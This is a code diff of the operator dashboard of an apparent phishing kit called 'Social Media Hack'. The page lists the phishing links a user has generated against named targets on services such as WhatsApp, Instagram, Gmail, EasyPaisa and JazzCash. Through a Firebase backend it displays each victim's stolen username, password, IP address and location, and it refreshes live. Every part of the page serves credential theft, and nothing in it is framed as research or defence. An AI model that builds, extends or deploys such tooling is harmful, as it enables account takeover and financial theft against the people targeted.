@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>User Dashboard</title>
+    <title>📊 My Dashboard - Social Media Hack</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <script src="firebase-config.js"></script>
@@ -11,217 +11,364 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0a0a0a;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
             color: #fff;
             padding: 20px;
         }
-        .container { max-width: 1000px; margin: 0 auto; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        
         .header {
-            background: linear-gradient(135deg, #ff6600, #ff3300);
-            padding: 30px;
+            background: linear-gradient(45deg, #ff6600, #ff3300);
+            padding: 25px;
             border-radius: 15px;
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
-        .header h1 { font-size: 2em; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
-        .header p { margin-top: 10px; opacity: 0.9; }
+        .header h1 { font-size: 2em; }
+        .header p { opacity: 0.9; margin-top: 5px; }
         
-        .dashboard-grid {
+        .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
         }
-        .card {
-            background: #111;
-            border: 1px solid #222;
+        .stat-card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
             border-radius: 12px;
             padding: 20px;
+            text-align: center;
         }
-        .card h3 { color: #ff6600; margin-bottom: 15px; }
-        .card .data-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid #222;
-        }
-        .card .data-row:last-child { border-bottom: none; }
-        .card .label { color: #888; }
-        .card .value { color: #0f0; font-weight: bold; }
+        .stat-card .num { font-size: 2.5em; font-weight: 900; color: #ff6600; }
+        .stat-card .lbl { color: #888; font-size: 0.9em; margin-top: 5px; }
         
-        .link-section {
-            background: #111;
+        .section {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.05);
             border-radius: 12px;
             padding: 20px;
             margin-bottom: 20px;
-            border: 1px solid #222;
         }
-        .link-section h3 { color: #ff6600; margin-bottom: 15px; }
+        .section h2 { color: #ff6600; margin-bottom: 15px; }
+        
         .link-item {
-            background: #1a1a1a;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 12px;
+        }
+        .link-item .top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .link-item .service-badge {
+            font-size: 0.85em;
+            padding: 4px 12px;
+            border-radius: 12px;
+        }
+        .link-item .target { color: #aaa; font-size: 0.9em; }
+        .link-item .link-url { 
+            color: #0f0; 
+            font-size: 0.85em; 
+            word-break: break-all;
+            background: rgba(0,0,0,0.3);
+            padding: 8px;
+            border-radius: 5px;
+            margin: 8px 0;
+        }
+        .link-item .status-badge { font-size: 0.8em; padding: 3px 10px; border-radius: 10px; }
+        .status-active { background: rgba(0,255,0,0.2); color: #0f0; }
+        .status-captured { background: rgba(255,102,0,0.2); color: #ff6600; }
+        
+        .capture-data {
+            margin-top: 10px;
+            padding: 12px;
+            background: rgba(0,255,0,0.05);
+            border: 1px solid #0f0;
+            border-radius: 8px;
+            display: none;
+        }
+        .capture-data .field { margin: 3px 0; }
+        .capture-data .field-name { color: #888; }
+        .capture-data .field-val { color: #0f0; font-weight: 600; }
+        .capture-data .password-val { color: #ff0; }
+        
+        .no-data { text-align: center; color: #666; padding: 40px; }
+        .no-data .big-icon { font-size: 4em; margin-bottom: 15px; }
+        
+        .back-btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background: #ff6600;
+            color: #fff;
+            border-radius: 8px;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+        .back-btn:hover { background: #ff5500; }
+        
+        .ip-info {
+            background: rgba(0,0,0,0.3);
             padding: 15px;
             border-radius: 8px;
-            margin-bottom: 10px;
-            border: 1px solid #333;
+            margin-bottom: 20px;
+            font-size: 0.9em;
+            color: #888;
         }
-        .link-item .service { color: #ff6600; font-weight: bold; }
-        .link-item .target { color: #888; }
-        .link-item .status { color: #0f0; }
-        .link-item .data-captured {
-            background: rgba(0,255,0,0.1);
-            padding: 10px;
+        .ip-info strong { color: #0ff; }
+        
+        .refresh-btn {
+            padding: 8px 20px;
+            background: #333;
+            border: 1px solid #555;
             border-radius: 5px;
-            margin-top: 10px;
-            display: none;
+            color: #fff;
+            cursor: pointer;
+            float: right;
+        }
+        .refresh-btn:hover { background: #444; }
+        
+        @media (max-width: 768px) {
+            .stats-grid { grid-template-columns: 1fr 1fr; }
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <a href="index.html" class="back-btn">⬅ Back to Main Tool</a>
+        
         <div class="header">
-            <h1>📊 User Dashboard</h1>
-            <p>🌐 Your IP: <span id="userIP">Detecting...</span></p>
+            <h1>📊 My Dashboard</h1>
+            <p>🌐 Your IP: <strong id="userIP">Detecting...</strong></p>
         </div>
         
-        <div class="dashboard-grid">
-            <div class="card">
-                <h3>📊 Your Stats</h3>
-                <div class="data-row">
-                    <span class="label">Links Generated</span>
-                    <span class="value" id="myLinks">0</span>
-                </div>
-                <div class="data-row">
-                    <span class="label">Data Captured</span>
-                    <span class="value" id="myCaptures">0</span>
-                </div>
-                <div class="data-row">
-                    <span class="label">Total Visits</span>
-                    <span class="value" id="myVisits">0</span>
-                </div>
+        <div class="ip-info">
+            👤 Your Visitor ID: <strong id="userVisitorID">Loading...</strong><br>
+            📍 Location: <span id="userLocation">Detecting...</span>
+        </div>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="num" id="statLinks">0</div>
+                <div class="lbl">🔗 Links Generated</div>
             </div>
-            
-            <div class="card">
-                <h3>🌍 IP Info</h3>
-                <div class="data-row">
-                    <span class="label">Your IP</span>
-                    <span class="value" id="displayIP">-</span>
-                </div>
-                <div class="data-row">
-                    <span class="label">ISP</span>
-                    <span class="value" id="displayISP">-</span>
-                </div>
-                <div class="data-row">
-                    <span class="label">Location</span>
-                    <span class="value" id="displayLocation">-</span>
-                </div>
+            <div class="stat-card">
+                <div class="num" id="statCaptured">0</div>
+                <div class="lbl">🔓 Data Captured</div>
+            </div>
+            <div class="stat-card">
+                <div class="num" id="statTargets">0</div>
+                <div class="lbl">🎯 Total Targets</div>
+            </div>
+            <div class="stat-card">
+                <div class="num" id="statVisits">0</div>
+                <div class="lbl">👁️ Total Visits</div>
             </div>
         </div>
         
-        <div class="link-section">
-            <h3>🔗 Your Generated Links</h3>
-            <div id="linksContainer">
-                <div style="text-align:center;color:#666;">Loading your links...</div>
+        <div class="section">
+            <h2>🔗 My Generated Links & Captured Data</h2>
+            <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
+            <div style="clear:both;"></div>
+            <div id="dataContainer">
+                <div class="no-data">
+                    <div class="big-icon">📂</div>
+                    <p>Loading your data...</p>
+                </div>
             </div>
         </div>
     </div>
-    
+
     <script>
-        let visitorID = localStorage.getItem('visitorID');
-        if (!visitorID) {
-            visitorID = 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            localStorage.setItem('visitorID', visitorID);
-        }
+        // ========================
+        // GET VISITOR ID
+        // ========================
+        const visitorID = localStorage.getItem('visitorID') || ('V' + Date.now() + '_' + Math.random().toString(36).substr(2, 6).toUpperCase());
+        document.getElementById('userVisitorID').textContent = visitorID;
         
+        // Get IP
         let userIP = 'Unknown';
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
-            .then(data => {
-                userIP = data.ip;
+            .then(d => {
+                userIP = d.ip;
                 document.getElementById('userIP').textContent = userIP;
-                document.getElementById('displayIP').textContent = userIP;
             });
         
+        // Get Location
         fetch('https://ipapi.co/json/')
             .then(r => r.json())
-            .then(data => {
-                document.getElementById('displayISP').textContent = data.org || 'Unknown';
-                document.getElementById('displayLocation').textContent = (data.city || '') + ', ' + (data.country_name || '');
+            .then(d => {
+                document.getElementById('userLocation').textContent = (d.city || '') + ', ' + (d.country_name || '') + ' | ISP: ' + (d.org || '');
             })
             .catch(() => {});
         
-        db.ref('generated_links').orderByChild('generatedBy').equalTo(visitorID).once('value', snapshot => {
-            const data = snapshot.val();
-            const container = document.getElementById('linksContainer');
+        // ========================
+        // LOAD DATA
+        // ========================
+        function loadData() {
+            const container = document.getElementById('dataContainer');
             
-            if (!data) {
-                container.innerHTML = '<div style="text-align:center;color:#666;">No links generated yet. Go to main page to generate links!</div>';
-                document.getElementById('myLinks').textContent = '0';
-                return;
-            }
-            
-            let html = '';
-            let count = 0;
-            const entries = Object.entries(data).reverse();
-            
-            entries.forEach(([linkId, item]) => {
-                count++;
-                const time = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
-                html += `
-                    <div class="link-item">
-                        <div><span class="service">${item.service || 'Unknown'}</span> | Target: <span class="target">${item.target || 'N/A'}</span></div>
-                        <div style="font-size:0.85em;color:#666;margin:5px 0;">Link: ${item.link || 'N/A'}</div>
-                        <div style="font-size:0.85em;">Status: <span class="status">${item.status || 'active'}</span> | ${time}</div>
-                        <div class="data-captured" id="captured_${linkId}">
-                            <strong style="color:#0f0;">🔓 Data Captured!</strong><br>
-                            <span id="captureData_${linkId}">Loading...</span>
-                        </div>
-                    </div>
-                `;
+            // Get all generated links by this visitor
+            db.ref('generated_links').once('value', function(snapshot) {
+                const allLinks = snapshot.val();
+                let myLinks = [];
+                let totalLinks = 0;
+                let totalCaptured = 0;
+                let totalTargets = new Set();
+                let totalVisits = 0;
                 
-                db.ref('captured_data/' + linkId).once('value', snap => {
-                    const capData = snap.val();
-                    const div = document.getElementById('captured_' + linkId);
-                    const dataSpan = document.getElementById('captureData_' + linkId);
-                    if (capData && div) {
-                        div.style.display = 'block';
-                        dataSpan.innerHTML = `
-                            👤 Username: ${capData.username || 'N/A'}<br>
-                            🔑 Password: ${capData.password || 'N/A'}<br>
-                            🌐 IP: ${capData.ip || 'N/A'}<br>
-                            📍 Location: ${capData.location || 'Unknown'}
-                        `;
-                    }
-                });
-            });
-            
-            container.innerHTML = html;
-            document.getElementById('myLinks').textContent = count;
-        });
-        
-        db.ref('generated_links').once('value', snapshot => {
-            const data = snapshot.val();
-            if (!data) return;
-            
-            let captureCount = 0;
-            let visitCount = 0;
-            
-            Object.entries(data).forEach(([linkId, item]) => {
-                if (item.generatedBy === visitorID) 
-                    db.ref('captured_data/' + linkId).once('value', snap => {
-                        if (snap.val()) captureCount++;
-                        document.getElementById('myCaptures').textContent = captureCount;
-                    });
-                    
-                    db.ref('visits/' + linkId).once('value', snap => {
-                        const visits = snap.val();
-                        if (visits) {
-                            visitCount += Object.keys(visits).length;
+                if (allLinks) {
+                    Object.entries(allLinks).forEach(([linkId, linkData]) => {
+                        if (linkData.generatedBy === visitorID) {
+                            myLinks.push({ id: linkId, ...linkData });
+                            totalLinks++;
+                            if (linkData.target) totalTargets.add(linkData.target);
                         }
-                        document.getElementById('myVisits').textContent = visitCount;
                     });
                 }
+                
+                if (myLinks.length === 0) {
+                    container.innerHTML = `
+                        <div class="no-data">
+                            <div class="big-icon">📂</div>
+                            <h3 style="margin-bottom:10px;">No Links Yet</h3>
+                            <p>Go to <a href="index.html" style="color:#ff6600;">Main Page</a> and generate your first link!</p>
+                        </div>
+                    `;
+                    document.getElementById('statLinks').textContent = '0';
+                    return;
+                }
+                
+                // Sort by timestamp (newest first)
+                myLinks.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+                
+                let html = '';
+                let processedCount = 0;
+                
+                myLinks.forEach((link, index) => {
+                    const time = link.timestamp ? new Date(link.timestamp).toLocaleString() : 'Unknown';
+                    const linkUrl = link.link || '#';
+                    const serviceIcon = link.serviceIcon || '📁';
+                    const serviceName = link.serviceName || link.service || 'Unknown';
+                    
+                    html += `
+                        <div class="link-item" id="link_${link.id}">
+                            <div class="top-row">
+                                <div>
+                                    <span class="service-badge" style="background:${link.service === 'whatsapp' ? '#25D366' : link.service === 'tiktok' ? '#000' : link.service === 'facebook' ? '#1877F2' : link.service === 'instagram' ? '#E4405F' : link.service === 'snapchat' ? '#FFFC00' : link.service === 'freefire' ? '#FF6600' : link.service === 'easypaisa' ? '#00A859' : link.service === 'jazzcash' ? '#ED1C24' : link.service === 'twitter' ? '#1DA1F2' : link.service === 'gmail' ? '#EA4335' : link.service === 'telegram' ? '#0088cc' : '#888'}; color: ${link.service === 'snapchat' ? '#000' : '#fff'};">${serviceIcon} ${serviceName}</span>
+                                </div>
+                                <div>
+                                    <span class="status-badge status-active" id="status_${link.id}">⏳ Waiting</span>
+                                </div>
+                            </div>
+                            <div class="target">🎯 Target: <strong>${link.target || 'N/A'}</strong></div>
+                            <div class="link-url">🔗 ${linkUrl}</div>
+                            <div style="font-size:0.8em; color:#666;">⏰ ${time}</div>
+                            <div class="capture-data" id="capture_${link.id}">
+                                <strong style="color:#0f0;">🔓 DATA CAPTURED!</strong>
+                                <div id="captureContent_${link.id}">Loading...</div>
+                            </div>
+                        </div>
+                    `;
+                });
+                
+                container.innerHTML = html;
+                document.getElementById('statLinks').textContent = totalLinks;
+                document.getElementById('statTargets').textContent = totalTargets.size;
+                
+                // Now check for captured data on each link
+                myLinks.forEach(link => {
+                    db.ref('captured_data/' + link.id).once('value', function(snap) {
+                        const data = snap.val();
+                        const captureDiv = document.getElementById('capture_' + link.id);
+                        const statusBadge = document.getElementById('status_' + link.id);
+                        
+                        if (data && data.username) {
+                            captureDiv.style.display = 'block';
+                            document.getElementById('captureContent_' + link.id).innerHTML = `
+                                <div class="field"><span class="field-name">👤 Username:</span> <span class="field-val">${data.username || 'N/A'}</span></div>
+                                <div class="field"><span class="field-name">🔑 Password:</span> <span class="field-val password-val">${data.password || 'N/A'}</span></div>
+                                <div class="field"><span class="field-name">🌐 IP:</span> <span class="field-val">${data.ip || 'N/A'}</span></div>
+                                <div class="field"><span class="field-name">📍 Location:</span> <span class="field-val">${data.location || 'Unknown'}</span></div>
+                                <div class="field"><span class="field-name">🕐 Time:</span> <span class="field-val">${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}</span></div>
+                            `;
+                            statusBadge.className = 'status-badge status-captured';
+                            statusBadge.textContent = '🔓 Captured';
+                            totalCaptured++;
+                            
+                            // Also count visits
+                            db.ref('visits/' + link.id).once('value', function(visitSnap) {
+                                const visits = visitSnap.val();
+                                if (visits) {
+                                    totalVisits += Object.keys(visits).length;
+                                }
+                                document.getElementById('statVisits').textContent = totalVisits;
+                            });
+                        } else {
+                            // Still waiting - listen for capture
+                            db.ref('captured_data/' + link.id).on('value', function(snap) {
+                                const newData = snap.val();
+                                if (newData && newData.username) {
+                                    captureDiv.style.display = 'block';
+                                    document.getElementById('captureContent_' + link.id).innerHTML = `
+                                        <div class="field"><span class="field-name">👤 Username:</span> <span class="field-val">${newData.username || 'N/A'}</span></div>
+                                        <div class="field"><span class="field-name">🔑 Password:</span> <span class="field-val password-val">${newData.password || 'N/A'}</span></div>
+                                        <div class="field"><span class="field-name">🌐 IP:</span> <span class="field-val">${newData.ip || 'N/A'}</span></div>
+                                        <div class="field"><span class="field-name">📍 Location:</span> <span class="field-val">${newData.location || 'Unknown'}</span></div>
+                                    `;
+                                    statusBadge.className = 'status-badge status-captured';
+                                    statusBadge.textContent = '🔓 Captured';
+                                    document.getElementById('statCaptured').textContent = parseInt(document.getElementById('statCaptured').textContent) + 1;
+                                }
+                            });
+                        }
+                        
+                        processedCount++;
+                        document.getElementById('statCaptured').textContent = totalCaptured;
+                    });
+                });
             });
-        });
+        }
+        
+        // Also count visits
+        function countVisits() {
+            db.ref('generated_links').once('value', function(snapshot) {
+                const data = snapshot.val();
+                if (!data) return;
+                let visitCount = 0;
+                const promises = [];
+                Object.entries(data).forEach(([linkId, linkData]) => {
+                    if (linkData.generatedBy === visitorID) {
+                        promises.push(
+                            db.ref('visits/' + linkId).once('value').then(snap => {
+                                const visits = snap.val();
+                                if (visits) visitCount += Object.keys(visits).length;
+                            })
+                        );
+                    }
+                });
+                Promise.all(promises).then(() => {
+                    document.getElementById('statVisits').textContent = visitCount;
+                });
+            });
+        }
+        
+        // Initial load
+        loadData();
+        setTimeout(countVisits, 1000);
+        
+        // Auto refresh every 15 seconds
+        setInterval(() => {
+            loadData();
+            countVisits();
+        }, 15000);
     </script>
 </body>
 </html>
